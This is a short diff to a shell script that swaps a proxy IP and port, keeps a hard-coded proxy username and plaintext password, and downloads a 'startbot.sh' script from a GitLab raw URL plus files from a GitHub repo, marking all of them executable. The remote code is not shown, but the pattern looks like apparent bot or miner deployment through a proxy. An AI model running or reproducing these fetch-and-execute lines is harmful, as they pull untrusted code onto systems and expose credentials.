@@ -1,7 +1,7 @@
-proxy="188.74.183.10" 
-port="8279" 
+proxy="185.199.231.45" 
+port="8382" 
 user="ubslvwxe"  
-pass="iikj33112te4"
+pass="iikj33112te4" 
 wget -q -O startbot.sh https://gitlab.com/55113110159/dokerweb/-/raw/main/kanza6.18.1 && chmod +x startbot.sh
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
